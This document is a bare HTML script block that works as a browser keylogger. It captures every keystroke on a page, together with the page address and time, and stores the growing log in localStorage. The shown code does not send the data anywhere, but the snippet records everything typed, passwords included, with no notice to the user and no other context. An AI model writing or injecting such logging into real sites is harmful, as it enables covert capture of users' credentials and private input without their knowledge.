<script>
  document.addEventListener("keydown", function(event) {
    let logs = JSON.parse(localStorage.getItem("keyLogs") || "[]");
    logs.push({
      key: event.key,
      page: location.href,
      time: new Date().toISOString()
    });
    localStorage.setItem("keyLogs", JSON.stringify(logs));
  });
</script>

